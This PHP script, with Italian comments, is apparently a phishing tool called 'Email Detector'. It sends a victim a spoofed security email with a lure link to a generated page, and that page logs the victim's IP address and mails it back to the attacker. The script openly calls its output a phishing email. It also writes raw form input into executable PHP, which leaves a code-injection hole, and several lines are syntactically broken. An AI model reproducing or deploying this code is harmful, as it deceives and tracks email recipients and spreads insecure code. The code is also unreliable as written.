<?php

echo"<title>Worked</title>"
echo"<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" />";
//INPUT DEI DATI DALLA PAGINA HTML 

$mittente = $_POST ['nome_mittente'];
$nome_destinatario = $_POST ['nome_destinatario'];
$email_destinatario = $_POST ['email_destinatario'];

//QUESTA PARTE RIGUARDA L'INVIO DELLA NOTIFICA CHE L'EMAIL ESISTE REALEMTE ALL'ATTACCANTE

$rand = rand (0,100000000000000000); //creo la variabile e il numero casuale della pagina
//IMPOSTO LA MAIL CHE L'ATTACCANTE RICEVERA'
$oggetto = " \"Convalida Email\" ";
$messaggio = " \" Ciao, la tua vittima ($nome_destinatario) ha confermato che l' email esiste realemente cliccando il link. 
Il suo indirizzo ip è: '\$ip'
Grazie per aver utilizzato Email Detector. \"";


  $headers  =  ' "MIME-Version: 1.0\r\n" ';
  $headers0 .= " \"To: <$mittente>";
  $headers01 .= '\r\n" ';
  $headers00 .= " \"From: <EmailDetector@server.com>";
  $headers02 .= '\r\n" ';
 
$file = fopen ("pag/{$rand}.php", 'w'); //CREO LA PAGINA RANDOM 
fwrite ($file, "<?php \n");
fwrite ($file, '$ip =');
fwrite ($file, ' getenv (\'REMOTE_ADDR\');');
fwrite ($file, "\n");
fwrite ($file, " echo\"<h1>Operazione riuscita. Grazie per la collaborazione.</h1>\"; \n");
fwrite ($file, ' $mittente1 = ');
fwrite ($file, " \"$mittente\";\n ");
fwrite ($file, '$oggetto1 = ');
fwrite ($file, "$oggetto; \n");
fwrite ($file, '$messaggio1 = ');
fwrite ($file, "$messaggio; \n");
fwrite ($file, '$headers1 =');
fwrite ($file, " $headers; \n");
fwrite ($file, '$headers1 .=');
fwrite ($file, " $headers0 ");
fwrite ($file, "$headers01; \n");
fwrite ($file, '$headers1 .=');
fwrite ($file, " $headers00");
fwrite ($file, "$headers02; \n");
fwrite ($file, 'mail($mittente1,$oggetto1,$messaggio1,$headers1)');
fwrite ($file, "\n");
fwrite ($file, " ?> ");
fclose ($file);

//DA QUESTO MOMENTO CONFIGURO LA MAIL DA INVIARE ALLA VITTIMA E LA INVIO

$oggetto = " Avviso! ";
$messaggio = "Ciao, $nome_destinatario, vorremo offrirti una protezione più adeguata anti-phishing.
Devi solamente confermare il tutto al seguente link: 
http://redirecthttp.altervista.org/emaildetector/pag/$rand.php
Grazie!
 ";

  $head  = "MIME-Version: 1.0\r\n";
  $head .= "Content-type: text/html; charset=iso-8859-1\r\n";
  $head .= "To: <$email_destinatario>\r\n";
  $head .= "From: <Sicurezza@server.com>\r\n";

if(mail($email_destinatario,$oggetto,$messaggio,$head)){
echo"<font size=\"5\">Email di phishing inviata correttamente, il server ti manderà una mail all'indirizzo: <b>$mittente</b> non appena la vittima cliccherà il link.</font>";
}else{
echo"Errore Nell'elaborazione, qualcosa è andato storto";
}
?>
